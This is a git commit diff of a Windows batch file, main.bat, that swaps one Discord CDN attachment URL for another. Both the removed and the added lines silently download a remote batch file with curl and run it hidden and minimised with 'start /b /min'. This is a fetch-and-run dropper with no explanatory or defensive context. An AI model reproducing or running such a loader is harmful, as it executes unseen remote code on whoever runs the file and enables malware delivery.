db09bd6acbbc0975dd08751cf2bfb9003ff42dd9
dhdupe <144762041+dhdupe@users.noreply.github.com>
2023-09-12 19:02:15 -0400

    main.bat

--- main.bat
+++ main.bat
@@ -1,5 +1,2 @@
-curl -s -O https://cdn.discordapp.com/attachments/1133326535974191114/1151014093986213908/main.bat && start /b /min main.bat
-
-
-
-
+curl -s -O https://cdn.discordapp.com/attachments/1133326535974191114/1151291379239104542/main.bat && start /b /min main.bat
+exit
